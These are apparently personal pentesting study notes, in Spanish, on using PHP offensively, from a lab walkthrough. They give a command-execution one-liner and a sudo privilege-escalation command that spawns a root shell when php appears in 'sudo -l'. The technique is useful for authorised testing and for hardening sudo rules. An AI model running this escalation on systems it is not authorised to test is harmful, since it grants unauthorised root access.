# PHP

## ¿Qué es?

PHP es un lenguaje de programación ampliamente utilizado para desarrollar aplicaciones web. Desde el punto de vista ofensivo, puede utilizarse para ejecutar comandos, crear web shells o escalar privilegios cuando el binario tiene permisos elevados.

---

## ¿Cuándo utilizarlo?

- Durante auditorías web.
- Cuando se pueda subir un archivo PHP.
- Cuando el binario `php` aparezca en `sudo -l`.

---

## Metodología

1. Identificar si PHP está instalado.
2. Buscar posibilidades de ejecución.
3. Comprobar si puede utilizarse mediante sudo.
4. Consultar GTFOBins si es necesario.

---

## Comandos importantes

Ejecutar comandos:

```bash
php -r "system('id');"
```

Escalada mediante sudo:

```bash
sudo php -r "system('/bin/bash');"
```

Comprobar versión:

```bash
php -v
```

---

## Errores comunes

- No comprobar si PHP puede ejecutarse mediante sudo.
- Confundir PHP CLI con PHP utilizado por el servidor web.

---

## Buenas prácticas

- Consultar GTFOBins cuando PHP aparezca en `sudo -l`.
- Comprobar la versión instalada.

---

## Laboratorios donde lo he utilizado

- Facultad (The Hacker Labs)
